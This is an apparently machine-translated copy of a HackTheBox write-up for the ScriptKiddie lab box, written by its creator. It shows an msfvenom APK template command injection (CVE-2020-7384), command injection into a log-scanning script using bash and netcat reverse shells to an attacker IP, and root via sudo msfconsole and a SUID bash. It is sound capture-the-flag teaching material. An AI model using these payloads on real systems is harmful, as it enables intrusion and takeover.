第三方msf 
hacker cron 
sudo msf 

# HTB： 脚本小子

[0xdf.gitlab.io](https://0xdf.gitlab.io/2021/06/05/htb-scriptkiddie.html)0xdf黑客的东西

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fscriptkiddie-cover.) 

脚本小子是我写的第三个在黑客盒子平台上上线的盒子。从我第一次听说msfvenom中的命令注入漏洞开始，我就想制作一个以新手黑客为主题的盒子，并尝试将其合并。为了拥有这个盒子，我会找到一些网站，里面有一些黑客可能使用的工具，包括让msfvenon创建有效载荷的选项。我将上传一个恶意模板，并在盒子上执行代码。从那里，我将利用另一个命令注入的cron来访问下一个用户。最后，对于 root 用户，我将滥用该用户的 sudo 权限以 root 身份运行 msfconsole，并使用内置的 shell 命令来获取根 shell。在“超越根”中，看看我为盒子实施的一些自动化。

## 箱子信息

名字

[脚本小子](https://www.hackthebox.eu/home/machines/profile/314) ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Ficons%2Fbox-scriptkiddie.png) 

发行日期

[06 2月 2021](https://twitter.com/hackthebox_eu/status/1357366014305009673)

停用日期

5 6月 2021

操作系统

操作系统 ![](https://image.cubox.pro/article/2022091809192232808/86382.jpg) 

基本点

简易 \[20\]

额定难度

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fscriptkiddie-diff.png) 

雷达图

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fscriptkiddie-radar.png) 

 ![](https://image.cubox.pro/article/2022091809192294225/76393.jpg) 

21 分 31 秒[![爵士皮扎兹](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F87804)](https://www.hackthebox.eu/home/users/profile/87804)

 ![](https://image.cubox.pro/article/2022091809192276507/23214.jpg) 

31 分 50 秒[![希梅克斯73](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F139466)](https://www.hackthebox.eu/home/users/profile/139466)

造物主

[![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F4935)](https://www.hackthebox.eu/home/users/profile/4935)-

## 侦察

### n地图

`nmap`查找两个打开的端口，TCP 22 （SSH） 和 5000 （通过蟒蛇的 HTTP）：

    oxdf@parrot$ sudo nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.226
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-28 13:14 EDT
    Nmap scan report for 10.10.10.226
    Host is up (0.17s latency).
    Not shown: 65519 closed ports
    PORT      STATE    SERVICE
    22/tcp    open     ssh
    5000/tcp  open     upnp
    
    Nmap done: 1 IP address (1 host up) scanned in 32.80 seconds
    
    oxdf@parrot$ nmap -p 22,5000 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.226
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-28 12:05 EDT
    Nmap scan report for 10.10.10.226
    Host is up (0.21s latency).
    
    PORT     STATE SERVICE VERSION
    22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
    |   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
    |_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
    5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
    |_http-title: k1d'5 h4ck3r t00l5
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 15.34 seconds
    

### HTTP - TCP 5000

The site is for kids hacker tools:

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210105155912077.png) 

There are three sections. The first takes an IP and runs against it. On scanning localhost, it seems to work:`nmap`

[![image-20210105161047151](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210105161047151.png)_Click for full size image_](https://0xdf.gitlab.io/img/image-20210105161047151.png)

The payloads section allows me to select from windows / linux / android, provide an lhost ip, and and option template file. Based on the text, I can assume that these are arguments passed to to generate a payload. On success, it returns the payload, which is downloadable. The link seems to work for the next five minutes:`msfvenom`

[![image-20210105161154652](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210105161154652.png)_Click for full size image_](https://0xdf.gitlab.io/img/image-20210105161154652.png)

The sploits section runs the input against and shows the results:`searchsploit`

[![image-20210105161800737](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210105161800737.png)_Click for full size image_](https://0xdf.gitlab.io/img/image-20210105161800737.png)

Given that all three of these seem to be running binaries from a Linux system, I’ll try command injection in each input, but without luck. Any non-alphanumeric characters in the searchsploit box lead to this warning:

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210528122728509.png) 

## Shell as kid

### CVE-2020-7384 Background

The version of metasploit on the box is 6.0.9, which is vulnerable to [CVE-2020-7384](https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md). I can use the command line or through the website to find this vulnerability:`searchsploit`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210528121353306.png) 

I actually worked with ExploitDB to get them to add this vulnerability to their database so that it would show up for this box. The vulnerability is a command injection in the way that handles an APK template file. The idea of the template file is that you can pass a legit or , and it will try to build a malicious file into that file while preserving the intended capability. This functionality allows for attackers to hide behind the legit functionality.`msfvenom``msfvenom``.exe``.apk`

### Build Payload

There’s also a metasploit exploit for this vulnerability which I found more reliable than the Python script:

    oxdf@parrot$ msfconsole
    ...[snip]...
    msf6 > search msfvenom
    
    Matching Modules
    ================
    
       #  Name                                                                    Disclosure Date  Rank       Check  Description
       -  ----                                                                    ---------------  ----       -----  -----------
       0  exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection  2020-10-29       excellent  No     Rapid7 Metasploit Framework msfvenom APK Template Command Injection
    
    
    Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection
    
    msf6 > use 0
    [*] No payload configured, defaulting to cmd/unix/reverse_netcat
    msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) >
    

The default options work, so I’ll just set my host and port:

    msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > set LHOST 10.10.14.15
    LHOST => 10.10.14.15
    msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > set LPORT 443
    LPORT => 443
    msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > options
    
    Module options (exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection):
    
       Name      Current Setting  Required  Description
       ----      ---------------  --------  -----------
       FILENAME  msf.apk          yes       The APK file name
    
    
    Payload options (cmd/unix/reverse_netcat):
    
       Name   Current Setting  Required  Description
       ----   ---------------  --------  -----------
       LHOST  10.10.14.15      yes       The listen address (an interface may be specified)
       LPORT  443              yes       The listen port
    
       **DisablePayloadHandler: True   (no handler will be created!)**
    
    
    Exploit target:
    
       Id  Name
       --  ----
       0   Automatic
    

Running it creates an file:`.apk`

    msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > run
    
    [+] msf.apk stored at /home/oxdf/.msf4/local/msf.apk
    

### Exploit

If I wanted to catch this shell with , I could start up an , but because the payload is an unstaged shell, I can also use . I’ll start a listener on TCP 443 using . Then I’ll upload the APK to the site:`msfconsole``exploit/multi/handler``nc``nc``nc -lnvp 443`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210528122202222.png) 

After a few seconds, the site returns an error:

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210105162443427.png) 

But there’s shell at :`nc`

    oxdf@parrot$ nc -lvnp 443
    listening on [any] 443 ...
    connect to [10.10.14.15] from (UNKNOWN) [10.10.10.226] 52132 
    

The shell returns with no prompt, but if I enter Linux commands (like ) and hit enter, they execute:`id`

    id
    uid=1000(kid) gid=1000(kid) groups=1000(kid)
    

The shell is running as the kid user. I’ll upgrade my shell using Python to get a TTY:

    python3 -c 'import pty;pty.spawn("bash")'
    kid@scriptkiddie:~/.ssh$ ^Z
    [1]+  Stopped                 nc -lvnp 443
    oxdf@parrot$ stty raw -echo; fg
    nc -lvnp 443
                reset
    reset: unknown terminal type unknown
    Terminal type? screen
    kid@scriptkiddie:~/.ssh$
    

I can grab :`user.txt`

    kid@scriptkiddie:~$ cat user.txt
    4cbc14d5************************
    

I could also write a public SSH key into , and then SSH into ScriptKiddie.`/home/kid/.ssh/authorized_keys`

## Shell as pwn

### Enumeration

#### kid’s Homedir

The code for the website is a Python app in :`/home/kid/html`

    kid@scriptkiddie:~/html$ ls
    __pycache__  app.py  static  templates
    

I noted above when looking for command injection vulnerabilities in the site that it threatened to “hack me back”. As kid, I can take a look at the code:

    def searchsploit(text, srcip):
        if regex_alphanum.match(text):
            result = subprocess.check_output(['searchsploit', '--color', text])
            return render_template('index.html', searchsploit=result.decode('UTF-8', 'ignore'))
        else:
            with open('/home/kid/logs/hackers', 'a') as f:
                f.write(f'[{datetime.datetime.now()}] {srcip}\n')
            return render_template('index.html', sserror="stop hacking me - well hack you back")
    

`regex_alphanum` is defined at the top of the file to do just what it sounds like:

    regex_alphanum = re.compile(r'^[A-Za-z0-9 \.]+$')
    

It will match a string that contains only alphnumeric characters plus space and period. If anything is submitted that doesn’t match that, it writes the name and source IP into a file, .`/home/kid/logs/hackers`

I can look at that format of that line using the Python shell:

    oxdf@parrot$ python3
    Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
    [GCC 10.2.1 20210110] on linux
    Type "help", "copyright", "credits" or "license" for more information.
    >>> import datetime
    >>> srcip = "10.10.14.15"
    >>> f'[{datetime.datetime.now()}] {srcip}\n'
    '[2021-05-28 12:37:32.655374] 10.10.14.15\n'
    

In the dir, the file is empty:`logs``hackers`

    kid@scriptkiddie:~/logs$ wc -l hackers 
    0 hackers
    

I can trigger the log, or write to it myself, but it immediately empties. I can show this by sending a single line that writes to the log, then cats the log, then sleeps, then cats the log again:

    kid@scriptkiddie:~/logs$ echo "[2021-05-28 12:37:32.655374] 10.10.14.15" > hackers; cat hackers; echo sleep; sleep 1; cat hackers; echo done
    [2021-05-28 12:37:32.655374] 10.10.14.15
    sleep
    done
    

It’s there, but then it’s not.

#### pwn’s Homedir

Looking at the other user, pwn, as kid I can see a file and a directory in the other user’s (pwn) homedir:

    kid@scriptkiddie:/home/pwn$ ls -l
    total 8
    drwxrw---- 2 pwn pwn 4096 May 28 16:30 recon
    -rwxrwxr-- 1 pwn pwn  250 Jan 28 17:57 scanlosers.sh
    

I can’t access the directory, but I can read :`recon``scanlosers.sh`

    #!/bin/bash
    
    log=/home/kid/logs/hackers
    
    cd /home/pwn/
    cat $log | cut -d' ' -f3- | sort -u | while read ip; do
        sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
    done
    
    if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
    

The script is taking the logs from the webapp, using and to get a unique list of IPs, and then looping over them and running to scan the top 10 ports on that IP, saving it in the folder. Then it clears the log.`cut``sort``nmap``recon`

That seems to be running each time something is written to the file, as the log clears immediately (I’ll show how in Beyond Root). Knowing how that’s being read, I’ll drop a log into the file again, this time with tcpdump running on my host:`hackers``hackers`

    kid@scriptkiddie:~/logs$ echo "[2021-05-28 12:37:32.655374] 10.10.14.15" > hackers
    

At , I see 10 ports being scanned:`tcpdump`

    oxdf@parrot$ sudo tcpdump -i tun0 not port 443
    tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
    listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
    12:41:37.918900 IP 10.10.10.226.33000 > 10.10.14.15.http: Flags [S], seq 1530446456, win 64240, options [mss 1357,sackOK,TS val 2988937361 ecr 0,nop,wscale 7], length 0
    12:41:37.918911 IP 10.10.14.15.http > 10.10.10.226.33000: Flags [R.], seq 0, ack 1530446457, win 0, length 0
    12:41:37.942751 IP 10.10.10.226.33380 > 10.10.14.15.pop3: Flags [S], seq 1475375272, win 64240, options [mss 1357,sackOK,TS val 2988937385 ecr 0,nop,wscale 7], length 0
    12:41:37.942824 IP 10.10.14.15.pop3 > 10.10.10.226.33380: Flags [R.], seq 0, ack 1475375273, win 0, length 0
    12:41:37.942863 IP 10.10.10.226.53306 > 10.10.14.15.netbios-ssn: Flags [S], seq 454771846, win 64240, options [mss 1357,sackOK,TS val 2988937385 ecr 0,nop,wscale 7], length 0
    12:41:37.942888 IP 10.10.14.15.netbios-ssn > 10.10.10.226.53306: Flags [R.], seq 0, ack 454771847, win 0, length 0
    12:41:37.942913 IP 10.10.10.226.50822 > 10.10.14.15.ftp: Flags [S], seq 501567112, win 64240, options [mss 1357,sackOK,TS val 2988937385 ecr 0,nop,wscale 7], length 0
    12:41:37.942933 IP 10.10.14.15.ftp > 10.10.10.226.50822: Flags [R.], seq 0, ack 501567113, win 0, length 0
    12:41:37.942956 IP 10.10.10.226.42776 > 10.10.14.15.smtp: Flags [S], seq 931967393, win 64240, options [mss 1357,sackOK,TS val 2988937385 ecr 0,nop,wscale 7], length 0
    12:41:37.942975 IP 10.10.14.15.smtp > 10.10.10.226.42776: Flags [R.], seq 0, ack 931967394, win 0, length 0
    12:41:37.942997 IP 10.10.10.226.36042 > 10.10.14.15.ms-wbt-server: Flags [S], seq 2803715103, win 64240, options [mss 1357,sackOK,TS val 2988937385 ecr 0,nop,wscale 7], length 0
    12:41:37.943016 IP 10.10.14.15.ms-wbt-server > 10.10.10.226.36042: Flags [R.], seq 0, ack 2803715104, win 0, length 0
    12:41:37.943041 IP 10.10.10.226.33926 > 10.10.14.15.telnet: Flags [S], seq 2868964441, win 64240, options [mss 1357,sackOK,TS val 2988937385 ecr 0,nop,wscale 7], length 0
    12:41:37.943060 IP 10.10.14.15.telnet > 10.10.10.226.33926: Flags [R.], seq 0, ack 2868964442, win 0, length 0
    12:41:37.943083 IP 10.10.10.226.43864 > 10.10.14.15.microsoft-ds: Flags [S], seq 899346322, win 64240, options [mss 1357,sackOK,TS val 2988937385 ecr 0,nop,wscale 7], length 0
    12:41:37.943101 IP 10.10.14.15.microsoft-ds > 10.10.10.226.43864: Flags [R.], seq 0, ack 899346323, win 0, length 0
    12:41:37.943166 IP 10.10.10.226.33020 > 10.10.14.15.http: Flags [S], seq 247415536, win 64240, options [mss 1357,sackOK,TS val 2988937385 ecr 0,nop,wscale 7], length 0
    12:41:37.943184 IP 10.10.14.15.http > 10.10.10.226.33020: Flags [R.], seq 0, ack 247415537, win 0, length 0
    

So it’s clear that script is running.

### Command Injection

#### POC

The script is also injectable. Each line of the log is going to go into to select the third and beyond objects () when separated by space (). Then it will to remove duplicates. This isolates the IP:`cut``-f3-``-d' '``sort -u`

    kid@scriptkiddie:~/logs$ echo "[2021-05-28 12:37:32.655374] 10.10.14.15" | cut -d' ' -f3-
    10.10.14.15
    

Then for each IP, it will run:

    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
    

So if I can put more than just an IP into the file where the IP should be, I can inject commands. For example, I’ll use a payload like

    kid@scriptkiddie:~/logs$ echo "x x x 127.0.0.1; ping -c 1 10.10.14.15 #" | cut -d' ' -f3- 
    x 127.0.0.1; ping -c 1 10.10.14.15 #
    

The first two are just cut out, so that payload starts after that. The next is the name of the file in . Then I put a 127.0.0.1 so it would have something to scan. Then there’s a to start a new command, which I’ll start with . Then a to comment out the rest of the line. That would make:`x``x``/recon``;``ping``#`

    sh -c "nmap --top-ports 10 -oN recon/x 127.0.0.1; ping -c 1 10.10.14.15 #.nmap x 127.0.0.1; ping -c 1 10.10.14.15 # 2>&1 >/dev/null" &
    

With syntax highlighting on the part inside :`sh -c ""`

    nmap --top-ports 10 -oN recon/x 127.0.0.1; ping -c 1 10.10.14.15 #.nmap x 127.0.0.1; ping -c 1 10.10.14.15 # 2>&1 >/dev/null
    

It’s clearly going to and then .`nmap``ping`

I’ll start and put that into the log:`tcpdump`

    kid@scriptkiddie:~/logs$ echo "x x x 127.0.0.1; ping -c 1 10.10.14.15 #"  > hackers
    

Immediately there’s ICMP at :`tcpdump`

    oxdf@parrot$ sudo tcpdump -i tun0 icmp
    tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
    listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
    12:50:17.736260 IP 10.10.10.226 > 10.10.14.15: ICMP echo request, id 1, seq 1, length 64
    12:50:17.736296 IP 10.10.14.15 > 10.10.10.226: ICMP echo reply, id 1, seq 1, length 64
    

#### Shell

With command injection verified, I’ll update the payload from a to a reverse shell. I could also do things like writes a SSH key or make a SUID copy of .`ping``sh`

I’ll write this payload with a reverse shell to the logs:

    kid@scriptkiddie:~/logs$ echo "x x x 127.0.0.1; bash -c 'bash -i >& /dev/tcp/10.10.14.15/443 0>&1' # ."  > hackers
    

Immediately at there’s a connection:`nc`

    oxdf@parrot$ nc -lnvp 443
    listening on [any] 443 ...
    connect to [10.10.14.15] from (UNKNOWN) [10.10.10.226] 52532
    bash: cannot set terminal process group (873): Inappropriate ioctl for device
    bash: no job control in this shell
    pwn@scriptkiddie:~$
    

Same shell upgrade for command history:

    pwn@scriptkiddie:~$ python3 -c 'import pty;pty.spawn("bash")'
    python3 -c 'import pty;pty.spawn("bash")'
    pwn@scriptkiddie:~$ ^Z
    [1]+  Stopped                 nc -lnvp 443
    oxdf@parrot$ stty raw -echo; fg
    nc -lnvp 443
                reset
    reset: unknown terminal type unknown
    Terminal type? screen
    pwn@scriptkiddie:~$ 
    

#### Common Issues

A lot of people I saw getting stuck on this step didn’t take into account the , or read it incorrectly. If you tried to just pass a reverse shell in without some spacing, then it would lead to weird results. For example, if you tried to pass:`cut`

    ; /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.15/443 0>&1' #
    

That would create:

    nmap --top-ports 10 -oN recon/-c '/bin/bash -i >& /dev/tcp/10.10.14.15/443 0>&1' #.nmap -c '/bin/bash -i >& /dev/tcp/10.10.14.15/443 0>&1' # 2>&1 >/dev/null
    

That’s going to try to scan , which is not going to resolve.`'/bin/bash -i >& /dev/tcp/10.10.14.15/443 0>&1'`

On the other hand, the Bash pipe shell will have some weird results:

    ; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc 10.10.14.15 443 > /tmp/f #
    

Passing that into gives a result:`cut`

    oxdf@parrot$ echo '; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc 10.10.14.15 443 > /tmp/f #' | cut -d' ' -f3-
    /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc 10.10.14.15 443 > /tmp/f #
    

That will inject into the command to be:

    nmap --top-ports 10 -oN recon//tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc 10.10.14.15 443 > /tmp/f #.nmap /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc 10.10.14.15 443 > /tmp/f # 2>&1 >/dev/null
    

That might actually work, just as a lucky result of what gets cut.

Another issues I saw was people forgetting to comment out the rest of the line. So take the payload I used without the comment:

    oxdf@parrot$ echo "x x x 127.0.0.1; ping -c 1 10.10.14.15" | cut -d' ' -f3-
    x 127.0.0.1; ping -c 1 10.10.14.15
    

That creates:

    nmap --top-ports 10 -oN recon/x 127.0.0.1; ping -c 1 10.10.14.15.nmap x 127.0.0.1; ping -c 1 10.10.14.15 2>&1 >/dev/null
    

第一个将失败，因为不是有效的 ip。但是第二个将起作用，但输出将全部通过管道传输到 。转速外壳会变得更加混乱：`ping``10.10.14.15.nmap``/dev/null`

    oxdf@parrot$ echo "x x x 127.0.0.1; bash -c 'bash -i >& /dev/tcp/10.10.14.15/443 0>&1'" | cut -d' ' -f3-
    x 127.0.0.1; bash -c 'bash -i >& /dev/tcp/10.10.14.15/443 0>&1'
    

成为：

    nmap --top-ports 10 -oN recon/x 127.0.0.1; bash -c 'bash -i >& /dev/tcp/10.10.14.15/443 0>&1'.nmap x 127.0.0.1; bash -c 'bash -i >& /dev/tcp/10.10.14.15/443 0>&1' 2>&1 >/dev/null
    

第一个调用将重新连接，但随后由于 .第二个实际上会起作用，如果你足够快，让听众接收到第一个连接，再次开始侦听，然后得到第二个。类似的东西会起作用。`bash``.nmap``nc``for i in {1..2}; do nc -lvnp 443; done`

## 外壳作为根

### 列举

我通常检查的第一件事是 ，它再次得到回报，因为pwn可以在没有密码的情况下以root身份运行：`sudo``msfconsole``sudo`

    pwn@scriptkiddie:~$ sudo -l
    Matching Defaults entries for pwn on scriptkiddie:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
    
    User pwn may run the following commands on scriptkiddie:
        (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
    

### 壳

在运行它时，我有一个元扫描终端作为根：

    pwn@scriptkiddie:~$ sudo /opt/metasploit-framework-6.0.9/msfconsole
    ...[snip]...
    msf6 >
    

从这里获得外壳的一种方法是下降到集成的Ruby外壳中， ：`irb`

    msf6 > irb
    [*] Starting IRB shell...
    [*] You are in the "framework" object
    
    irb: warn: can't alias jobs from irb_jobs.
    >> 
    

从那里，我可以运行任意命令。一种方法是复制并设置它SUID：`system``bash`

    >> system("cp /bin/bash /tmp/0xdf; chmod 4777 /tmp/0xdf")
    => true
    

现在，这将给出一个根壳：

    kid@scriptkiddie:~$ /tmp/0xdf -p
    0xdf-5.0# id
    uid=1000(kid) gid=1000(kid) euid=0(root) groups=1000(kid)
    

更简单，我可以从以下位置运行：`system("bash")``irb`

    >> system("bash")
    root@scriptkiddie:/home/pwn#
    

更简单，我可以从 MSF 提示符运行终端命令：

    msf6 > bash                                                                    
    [*] exec: bash
    
    root@scriptkiddie:/home/pwn#
    

无论使用哪种方法，我现在都可以抓住：`root.txt`

    0xdf-5.0# cat /root/root.txt
    b2b48d52************************
    

## 超越根

### 铬合金

还有两个任务作为 pwn 运行，存储在：`incron``/var/spool/incron/pwn`

    /home/pwn/recon/        IN_CLOSE_WRITE  sed -i 's/open  /closed/g' "$@$#"
    /home/kid/logs/hackers  IN_CLOSE_WRITE   /home/pwn/scanlosers.sh
    

`incron`，来自 iNotify cron，是一项服务，它将监视不同类型的文件系统事件并基于它们触发操作。例如，上面的第一行。它正在查看文件夹，并在事件上触发。每当该文件夹中有写入事件时，它就会运行。此行是一个清理机制。它将采用写入的所有扫描数据并替换为已关闭。这只是要小心，不要让玩家机器的扫描件躺在主机上。任何找到的打开端口仍将显示为已关闭。`/home/pwn/recon``IN_CLOSE_WRITE``sed``/home/pwn/recon``open`

第二个是触发特权第一步的触发因素。它查找写入文件的事件，然后作为 pwn 运行。这就是作业设法在日志生成时立即触发的方式。`hackers``scanlosers.sh`

### 滤波

该网页采用一个 IP 地址，并将对该 IP 进行 nmap 扫描。为了防止玩家扫描其网络中的其他玩家，我将其设置为仅扫描具有以下逻辑的玩家自己的IP和其他HTB机器：

    def scan(ip):
        if regex_ip.match(ip):
            if not ip == request.remote_addr and ip.startswith('10.10.1') and not ip.startswith('10.10.10.'):
                stime = random.randint(200,400)/100
                time.sleep(stime)
                result = f"""Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-02 13:36 UTC\nNote: Host seems down. If it is really up, but blocking our ping probes, try -Pn\nNmap done: 1 IP address (0 hosts up) scanned in {stime} seconds""".encode()
            else:
                result = subprocess.check_output(['nmap', '--top-ports', '100', ip])
            return render_template('index.html', scan=result.decode('UTF-8', 'ignore'))
    

基本上，给定的IP不是用户自己的IP，它从10.10.1开始，而不是10.10.10（允许玩家扫描其他HTB机器），然后它使用静态输出说主机已关闭。它选择2到4秒之间的随机扫描时间，并增加该时间的睡眠以获得正确的感觉。`nmap`

[查看原网页: 0xdf.gitlab.io](https://0xdf.gitlab.io/2021/06/05/htb-scriptkiddie.html)